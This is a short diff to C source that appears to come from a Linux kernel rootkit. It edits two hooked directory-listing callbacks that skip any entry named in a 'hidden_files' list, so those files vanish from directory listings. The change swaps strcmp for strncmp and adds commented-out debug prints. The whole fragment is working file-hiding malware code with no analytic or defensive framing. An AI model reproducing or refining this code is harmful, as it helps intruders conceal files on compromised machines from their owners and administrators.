@@ -581,9 +581,10 @@ static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t of
 static int n_root_filldir( struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
 {
     struct hidden_file *hf;
+    //DEBUG("n_root_filldir, name: %s, namelen: %d\n", name, namelen);
 
     list_for_each_entry ( hf, &hidden_files, list )
-        if ( ! strcmp(name, hf->name) )
+        if ( ! strncmp(name, hf->name, namelen) )
             return 0;
 
     return root_filldir(nrf_ctx, name, namelen, offset, ino, d_type);
@@ -592,9 +593,10 @@ static int n_root_filldir( struct dir_context *nrf_ctx, const char *name, int na
 static int n_data1_filldir( struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
 {
     struct hidden_file *hf;
+    //DEBUG("n_data1_filldir, name: %s, namelen: %d\n", name, namelen);
 
     list_for_each_entry ( hf, &hidden_files, list )
-        if ( ! strcmp(name, hf->name) )
+        if ( ! strncmp(name, hf->name, namelen) )
             return 0;
 
     return root_filldir(nrf_ctx, name, namelen, offset, ino, d_type);
